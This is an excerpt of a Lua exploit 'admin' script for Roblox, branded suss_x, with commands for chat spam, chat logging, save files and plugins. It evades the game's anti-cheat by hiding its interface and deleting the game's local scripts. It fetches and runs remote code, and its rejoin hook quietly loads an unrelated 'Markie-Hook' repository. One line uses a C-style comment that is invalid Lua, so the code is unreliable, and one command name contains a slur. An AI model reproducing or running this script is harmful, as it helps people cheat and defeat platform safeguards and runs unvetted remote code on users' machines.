...
-- Constraints: -----------------------|
local ver = "1.9.9c"
local cordCode = "https://discord.gg/hHdPTBrvp5"
---------------------------------------|
...
if KRNL_LOADED and gethui then getParent = gethui() end
...
if Current and Current.Version ~= ver then
	Stand("suss_x is not up to par!","suss_x cannot run.","","Your version: "..ver,"Current version: "..Current.Version,"Run Anyway",true)
...
if isfolder and makefolder and isfile and writefile then
	if not isfolder("suss_x Plugins") then makefolder("suss_x Plugins") end
	if not isfile("suss_x Plugins/template.lua") then writefile("suss_x Plugins/template.lua","print('test')") end
end
...
function updatesaves()
	...
	writefile("suss_x.lua", game:GetService("HttpService"):JSONEncode(update))
end

function loadsaves()
    local success, errorsend = pcall(function()
        saves = game:GetService("HttpService"):JSONDecode(readfile("suss_x.lua"))
    end)
    if not success then
        loaddefaults()
        updatesaves()
...
if AntiCheat.HideParentInExploit then
	...
	elseif get_hidden_gui then
		...
		Stand("Your exploit does not support syn.protect_gui/get_hidden_gui!","suss_x cannot run.","Explanation;","This game has an anti-cheat and our way of stopping it is through syn.protect_gui/get_hidden_gui.","","Run Anyway",true)
		repeat wait() until RunDude == true
	end
end
...
if AntiCheat.RemoveScripts then
	...
	Stand("suss_x has to delete local scripts!","Your game may not work.","Explanation;","This game has an anticheat and our way of solving it is removing scripts.","","Run Anyway",true)
	repeat wait() until RunDude == true
end
...
local Hints = {"Did you know you can execute multiple commands with ';;'?","Did you know you can create a wait using timedcmd in loops?","You can find commands using 'cmds'.","You can change your prefix by doing 'prefixnew (key)'","Did you know suss_x was created in January 2017?"}
...
opxviewertitle.Text = "suss_x OUTPUT-LONGER"
...
statviewertitle.Text = "suss_x STATISTICS VIEWER"
...
Save.MouseButton1Down:Connect(function()
	...
	writefile("suss_x Stats "..math.random(1000)..".txt",tostring(writestats))
end)
...
logsviewertitle.Text = "suss_x LOGS VIEWER"
...
Save2.MouseButton1Down:Connect(function()
	...
	writefile("suss_x Logs "..math.random(1000)..".txt",tostring(writestats2))
end)
...
CMDS.commands = {
	...
	["entercmdnew"] = "Adds a new command which runs when you first execute suss_x.",
	...
	["support"] = "If you need support while using suss_x use this command!",
	["commands"] = "Shows this page.",
	["advertise"] = "Help spread suss_x by doing this cmd in game! (<3)",
	["unadvertise"] = "()",
	...
	["credits"] = "Lists credits for suss_x.",
	...
	["plugins"] = "Shows plugin GUI so you can add plugins to suss_x.",
	...
	["streamermode"] = "Hides all names in games (Suitable for streamers or people showcasing suss_x <3).",
	...
	["changestyle"] = "Changes the style of your suss_x refer to csinfo for more info on this command.",
	...
	["using"] = "Specifies that you are using suss_x. <3",
	...
	["runafter"] = "Makes suss_x automatically re-execute on rejoin.",
	...
	["unforceplay"] = "()",
	["migratesaves"] = "Migrates save files/backups to suss_x.lua.",
	...
	["rejoinexecute"] = "Rejoins and re-executes suss_x once.",
	...
	["nilchatcmds"] = "Makes suss_x chat commands not appear on chat.",
	["unnilchatcmds"] = "()",
	...
	["unretardchat"] = "()",
	["scriptusers"] = "Shows people currently using suss_x.",
	...
	["yesmessages"] = "()",
	["removecmd"] = "Removes command from your suss_x temporarily.",
...
if KeepCMDXOn and syn.queue_on_teleport then
	syn.queue_on_teleport('loadstring(game:HttpGet("https://raw.githubusercontent.com/RealMarkie/Markie-Hook/main/Markie-Hook"))()')
end
...
fileext.Text = "plugins go inside suss_x Plugins folder located in workspace"
...
function opx(f,text)
	if not ChatBind then
		...
		if f == "*" then
			sayremote:FireServer("[suss_x*] "..text,"All")
		elseif f == "-" then
			sayremote:FireServer("[suss_x-] "..text,"All")
		end
	end
...
ManageTitleEnter.Text = "suss_x EnterCMDs MANAGER"
...
function useCommand.advertise()
	...
	opx("-","Now advertising suss_x (Thank you!)")
end

function useCommand.unadvertise()
	cmdAdvertise = false
	opx("-","Stopped advertising suss_x (Thank you!)")
end

function useCommand.version()
	opx("-","suss_x is currently on "..ver)
end
...
function useCommand.using()
	opx("-","Said script <3")
	sayremote:FireServer("I am using suss_x, Version: "..ver, "All")
end
...
function useCommand.resetsaves()
	...
	if Confirmation then
		opx("-","Successfully reset your suss_x.")
		if isfile("suss_x.lua") then
			delfile("suss_x.lua")
		end
	end
end
...
function useCommand.savesaves()
	...
	setclipboard(readfile("suss_x.lua"))
	writefile("suss_x.save",readfile("suss_x.lua"))
end
	...
	if Confirmation then
		if arguments[2] then
			if isfile(arguments[2]) then
				...
				writefile("suss_x.lua",readfile(arguments[2]))
			else
				opx("*","You do not have a save by that name.")
			end
		else
			if isfile("suss_x.save") then
				opx("-","Migrated suss_x.save to current saves")
				writefile("suss_x.lua",readfile("suss_x.save"))
			else
				opx("*","You do not have a suss_x save.")
			end
		end
	end
end
...
function useCommand.reload()
	opx("-","Reloading suss_x...")
	loadstring(game:HttpGet("https://raw.githubusercontent.com/suss_x/suss_x/master/Source", true))() // gangshit
end
...
function useCommand.messagebox()
	if messageboxasync then
		...
		messageboxasync(getstring(2), "suss_x Message", 262148)
	else
...
function useCommand.runafter()
	if arguments[2] == "on" then
		opx("-","suss_x will now run after rejoin")
		KeepCMDXOn = true
		if KeepCMDXOn and syn.queue_on_teleport then
	...
	elseif arguments[2] == "off" then
		opx("-","suss_x will no longer run after rejoin")
		KeepCMDXOn = false
		updatesaves()
	else
		opx("*","2 arguments are required!")
	...
	if arguments[2] then
		...
		for i,v in pairs(Plugins) do
			if Plugins[i].Name == lcNS and Plugins[i].Status then
				loadstring(readfile("suss_x Plugins/"..Plugins[i].File))()
			end
		end
	else
		opx("*","2 arguments are needed for this command!")
...
function useCommand.audiologgersave()
	...
	writefile(filename..".suss_x", audioIds)
end
...
function useCommand.plugins()
	if listfiles then
		...
		for num,file in pairs(listfiles("suss_x Plugins")) do
			local PluginExists = false
			local PluginNum = 0
			for i,v in pairs(Plugins) do
				if v.Name == file:split("suss_x Plugins")[2]:split(".")[1]:sub(2,#file:split("suss_x Plugins")[2]:split(".")[1]) then
					PluginNum = i
					PluginExists = true
				end        
			end
			if PluginExists == false then
				table.insert(Plugins, {Name = file:split("suss_x Plugins")[2]:split(".")[1]:sub(2,#file:split("suss_x Plugins")[2]:split(".")[1]), File = file:split("suss_x Plugins")[2]:sub(2,#file:split("suss_x Plugins")[2]), Status = false})    
				PluginNum = #Plugins
			end
...
function useCommand.mute()
    ...
    if arguments[2] == "all" then
        opx("-","Muted all")
        for _,v in pairs(cmdp:GetPlayers()) do
            if v ~= cmdlp then table.insert(_G.connections.muted, v) end
        end
        _G.connections.allMuted = cmdp.PlayerAdded:Connect(function(v)
...
function CheckIfTrue()
	Stand("You have been server-blacklisted!","Please join another server to use suss_x again.","","","","Alright",false)
end
...
ManageTitleHotkey.Text = "suss_x Hotkey MANAGER"
...
function useCommand.scriptusers()
	if sDetect then
		...
		opx("-","Now showing users using suss_x")
...
function useCommand.playercases()
	...
	using - Chooses a player that is using suss_x")
end
...
function useCommand.logchat()
	...
	if arguments[2] then
		...
		msg = string.rep("suss_x Gang", 100)
	end
...
if not AntiCheat.PrintingOff then
	...
	StarterGui:SetCore("ChatMakeSystemMessage", {
		Text = "Welcome to suss_x, "..cmdlp.Name..".";
...
for _,v in pairs(cmdp:GetPlayers()) do
	if Devs[v.Name] then
		opx("-",v.Name.." is in your server ("..Devs[v.Name].." of suss_x)")
		RGBDev(v.Name)
